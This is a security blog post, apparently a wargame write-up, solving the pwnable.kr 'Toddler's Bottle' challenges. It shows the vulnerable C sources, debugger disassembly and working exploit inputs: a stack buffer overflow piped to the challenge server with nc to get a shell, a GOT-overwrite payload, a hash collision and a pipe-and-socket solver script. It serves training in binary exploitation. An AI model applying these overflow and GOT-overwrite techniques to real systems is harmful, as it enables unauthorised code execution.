+++
title = "Todlers Bottle write ups"
description = "Todlers Bottle write ups"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "todlers-bottle-write-ups-pwanable-kr"
project_url = "https://greyhat.dk/todlers-bottle-write-ups-pwanable-kr"
type = "post"
+++


Toddler's Bottle - fd

ifd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}

fd@ubuntu:~$ ./fd 4659
learn about Linux file IO
fd@ubuntu:~$ ./fd 4658
learn about Linux file IO
fd@ubuntu:~$ ./fd 4657
learn about Linux file IO
fd@ubuntu:~$ man read
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)



Toddler's Bottle - collision

col@ubuntu:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}

col@ubuntu:~$ ./col $(python -c 'print "\xcc\xcc\xcc\x01"*4 + "\xbc\xd6\xa9\x1a"')


Toddler's Bottle - bof

cat bof.c                                                                                                                                                                (master) 1
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

$ (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -)|nc pwnable.kr 9000                                                                                                  (master) 1
ls
bof
bof.c
flag
log
super.pl
cat flag


Toddler's Bottle - flag

http://pwnable.kr/bin/flag

kgn@kali:~$ upx -d -o flag.unupx flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: flag: FileAlreadyExistsException: flag.unupx: File exists

Unpacked 0 files.
kgn@kali:~$ rm flag.unupx
kgn@kali:~$ upx -d -o flag.unupx flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    887219 <-    335288   37.79%  linux/ElfAMD   flag.unupx

Unpacked 1 file.
kgn@kali:~$ r2 flag.unupx
Warning: Cannot initialize dynamic section
[0x00401058]> aaa
Function too big at 0x496608
[0x00401058]> pdf @main
/ (fcn) sym.main 61
|          ; var int local_1      @ rbp-0x8
|          ; DATA XREF from 0x00401075 (entry0)
|          ;-- main:
|          ;-- sym.main:
|          0x00401164    55             push rbp
|          0x00401165    4889e5         mov rbp, rsp
|          0x00401168    4883ec10       sub rsp, 0x10
|          0x0040116c    bf58664900     mov edi, str.I_will_malloc___and_strcpy_the_flag_there._take_it. ; "I will malloc() and strcpy the flag there. take it." @ 0x496658
|          0x00401171    e80a0f0000     call sym._IO_puts               ; sym._setjmp+0x560 ;sym._setjmp() ; sym.puts
|          0x00401176    bf64000000     mov edi, 0x64                  ; 'd'
|          0x0040117b    e850880000     call sym.__libc_malloc          ; sym._setjmp+0x7eb0 ;sym._setjmp() ; sym.malloc
|          0x00401180    488945f8       mov qword [rbp-local_1], rax
|          0x00401184    488b15e50e2c.  mov rdx, qword [rip + 0x2c0ee5]  ; [0x6c2070:8]=0x496628 str.UPX...__sounds_like_a_delivery_service_:_ ; "(fI" @ 0x6c2070
|          0x0040118b    488b45f8       mov rax, qword [rbp-local_1]
|          0x0040118f    4889d6         mov rsi, rdx
|          0x00401192    4889c7         mov rdi, rax
|          0x00401195    e886f1ffff     call fcn.00400320 ;fcn.00400320()
|          0x0040119a    b800000000     mov eax, 0
|          0x0040119f    c9             leave
\          0x004011a0    c3             ret
[0x00401058]> px @ str.UPX...__sounds_like_a_delivery_service_:_
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00496628  5550 582e 2e2e 3f20 736f 756e 6473 206c  UPX...? sounds l
0x00496638  696b 6520 6120 6465 6c69 7665 7279 2073  ike a delivery s
0x00496648  6572 7669 6365 203a 2900 0000 0000 0000  ervice :).......
0x00496658  4920 7769 6c6c 206d 616c 6c6f 63         I will malloc
[0x00401058]> quit
kgn@kali:~$ strings flag.unupx |grep UPX


Toddler's Bottle - passcode

passcode@ubuntu:~$ gdb -q ./passcode
Reading symbols from /home/passcode/passcode...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/passcode/passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Welcome Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A!
enter passcode1 : enter passcode2 : checking...
Login Failed!
[Inferior 1 (process 54455) exited normally]
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048665 <+0>:	push   ebp
   0x08048666 <+1>:	mov    ebp,esp
   0x08048668 <+3>:	and    esp,0xfffffff0
   0x0804866b <+6>:	sub    esp,0x10
   0x0804866e <+9>:	mov    DWORD PTR [esp],0x80487f0
   0x08048675 <+16>:	call   0x8048450 <puts@plt>
   0x0804867a <+21>:	call   0x8048609 <welcome>
   0x0804867f <+26>:	call   0x8048564 <login>
   0x08048684 <+31>:	mov    DWORD PTR [esp],0x8048818
   0x0804868b <+38>:	call   0x8048450 <puts@plt>
   0x08048690 <+43>:	mov    eax,0x0
   0x08048695 <+48>:	leave
   0x08048696 <+49>:	ret
End of assembler dump.
(gdb) disassemble login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	sub    esp,0x28
   0x0804856a <+6>:	mov    eax,0x8048770
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    eax,0x8048783
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave
   0x080485f0 <+140>:	ret
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) break *0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) r
Starting program: /home/passcode/passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Welcome Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A!

Breakpoint 1, 0x080485c0 in login ()
(gdb) x/p ebp-0x10
No symbol table is loaded.  Use the "file" command.
(gdb) x/p $ebp-0x10
0xff884e48:	Undefined output format "p".
(gdb) x/x $ebp-0x10
0xff884e48:	0x41326441


kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x41326441
[*] Exact match at offset 96

(gdb) quit
A debugging session is active.

	Inferior 1 [process 54483] will be killed.

Quit anyway? (y or n) y
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin
0804a000 R_386_JUMP_SLOT   printf
0804a004 R_386_JUMP_SLOT   fflush
0804a008 R_386_JUMP_SLOT   __stack_chk_fail
0804a00c R_386_JUMP_SLOT   puts
0804a010 R_386_JUMP_SLOT   system
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit
0804a01c R_386_JUMP_SLOT   __libc_start_main
0804a020 R_386_JUMP_SLOT   __isoc99_scanf


passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"|.passcode
> ^C
passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"'|./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
enter passcode1 : Now I can safely trust you that you have credential :)


Toddler's Bottle - random

random@ubuntu:~$ cat random.c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

random@ubuntu:~$ ./random
-2147483648
Wrong, maybe you should try 2^32 cases.
random@ubuntu:~$ gdb -q randomError: can not access /proc.

Reading symbols from /home/random/random...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   rbp
   0x00000000004005f5 <+1>:	mov    rbp,rsp
   0x00000000004005f8 <+4>:	sub    rsp,0x10
   0x00000000004005fc <+8>:	mov    eax,0x0
   0x0000000000400601 <+13>:	call   0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400609 <+21>:	mov    DWORD PTR [rbp-0x8],0x0
   0x0000000000400610 <+28>:	mov    eax,0x400760
   0x0000000000400615 <+33>:	lea    rdx,[rbp-0x8]
   0x0000000000400619 <+37>:	mov    rsi,rdx
   0x000000000040061c <+40>:	mov    rdi,rax
   0x000000000040061f <+43>:	mov    eax,0x0
   0x0000000000400624 <+48>:	call   0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040062c <+56>:	xor    eax,DWORD PTR [rbp-0x4]
   0x000000000040062f <+59>:	cmp    eax,0xdeadbeef
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    edi,0x400763
   0x000000000040063b <+71>:	call   0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    edi,0x400769
   0x0000000000400645 <+81>:	mov    eax,0x0
   0x000000000040064a <+86>:	call   0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    eax,0x0
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    edi,0x400778
   0x000000000040065b <+103>:	call   0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    eax,0x0
   0x0000000000400665 <+113>:	leave
   0x0000000000400666 <+114>:	ret
End of assembler dump.
(gdb) break *0x0000000000400615
Breakpoint 1 at 0x400615
(gdb) r
Starting program: /home/random/random

Breakpoint 1, 0x0000000000400615 in main ()
(gdb) x/x $rbp-0x4
0x7fff504893bc:	0x6b8b4567
(gdb) x/x $rbp-0x8
0x7fff504893b8:	0x00000000
(gdb) !echo "ibase=16; 6B8B4567"|bc
1804289383
(gdb) !echo "ibase=16;DEADBEEF"|bc
3735928559
(gdb) !python -c 'print 1804289383^3735928559'
3039230856
(gdb) c
Continuing.
3039230856
Good!
/bin/cat: flag: Permission denied
[Inferior 1 (process 60632) exited normally]
(gdb) quit
random@ubuntu:~$ ./random
3039230856
Good!


Toddler's Bottle - input


my solution

mkdir -p /tmp/desdic && cd /tmp/desdic && ln -s /home/input/flag .

cat /home/input/input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");

	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");
	return 0;
}

#!/usr/bin/python

import os
import socket
import time

port = 10102

r1, w1 = os.pipe()
r2, w2 = os.pipe()

os.putenv('\xde\xad\xbe\xef', '\xca\xfe\xba\xbe')
f = open("\x0a", "w");
f.write("\x00\x00\x00\x00")
f.close()

if os.fork():
        os.close(w1)
        os.close(w2)
        os.dup2(r1, 0)
        os.dup2(r2, 2)
        os.execv('/home/input/input', ['input'] + ['A'] * 64 + [''] + ['\x20\x0a\x0d'] + [str(port)] + ['A']*32)

else:
        os.close(r1)
        os.close(r2)
        f1 = os.fdopen(w1,'w')
        f2 = os.fdopen(w2,'w')
        f1.write('\x00\x0a\x00\xff')
        f2.write('\x00\x0a\x02\xff')
        f1.close()
        f2.close()
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect(('127.0.0.1', port))
        c.send('\xde\xad\xbe\xef')
        c.close()


